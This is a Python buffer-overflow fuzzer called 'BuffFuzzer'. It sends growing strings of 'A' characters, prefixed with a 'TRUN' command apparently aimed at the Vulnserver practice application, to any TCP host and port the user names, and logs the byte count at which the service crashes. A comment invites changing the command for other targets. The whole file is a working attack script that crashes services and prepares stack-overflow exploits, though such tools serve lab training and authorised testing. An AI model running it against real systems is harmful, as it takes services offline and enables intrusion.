#!/usr/bin/env python3
import sys
import time
import socket
import argparse
from color_print import print_success, print_error, print_info

def main():
    parser = argparse.ArgumentParser(description="BuffFuzzer v1.0")
    parser.add_argument("-ip",  type=str, help="Target IP address",  required=True)
    parser.add_argument("-port", type=int, help="Target port number", required=True)
    parser.add_argument("-output", type=str, help="Output file (optional)", required=False)
    args = parser.parse_args()
    target_ip = args.ip
    target_port = args.port
    output_file = args.output

    buffer = "A" * 100

    while True:
        try:
            print(f"[-]Sending payload with {len(buffer)} bytes")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.send(("TRUN /.:/" + buffer).encode())                       # 修改为适当的命令
            s.settimeout(10)
            response = s.recv(1024)

            if not response:
                print(f"Target response timed out. Crashed at {len(buffer)} bytes.")
                sys.exit()

            s.close()
            time.sleep(1)
            buffer += "A" * 100

        except socket.timeout:
            print_success(f"Target response timed out. Crashed at {len(buffer)} bytes.")
            if output_file:
                with open(output_file, "a") as f:
                    f.write(f"Target crashed at {len(buffer)} bytes\n")
            sys.exit()
        except Exception as e:
            print_error(f"An error occurred: {e}")
            sys.exit()

if __name__ == "__main__":
    main()
